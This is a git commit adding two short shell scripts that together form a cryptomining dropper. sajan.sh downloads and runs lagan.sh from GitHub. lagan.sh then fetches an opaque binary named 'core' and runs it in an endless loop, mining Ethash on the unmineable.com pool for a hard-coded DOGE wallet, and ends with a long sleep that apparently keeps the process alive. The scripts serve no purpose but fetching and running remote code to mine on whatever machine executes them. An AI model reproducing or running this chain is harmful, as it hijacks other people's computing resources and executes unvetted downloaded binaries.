dda08970e37f97c6a5e2895996f4e340c1ed97fd
dreamistoken <88270239+dreamistoken@users.noreply.github.com>
2021-08-19 20:41:44 +0600

    Add files via upload

---
+++ lagan.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+POOL=ethash.unmineable.com:3333
+WALLET=DOGE:DT7UtNqk6fZrpWRm8gUSULJ6KHMusSjtXz
+WORKER=$(echo $(shuf -i 1000000-9999999 -n 1)-COIN#816c-v7qn)
+wget https://github.com/dreamistoken/core/raw/main/core
+chmod +x core
+while [ 1 ]; do
+./core --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+sleep 5
+done
+sleep 999999999 
---
+++ sajan.sh
@@ -0,0 +1,4 @@
+#!/bin/sh
+wget https://github.com/dreamistoken/core/raw/main/lagan.sh
+chmod +x lagan.sh
+./lagan.sh
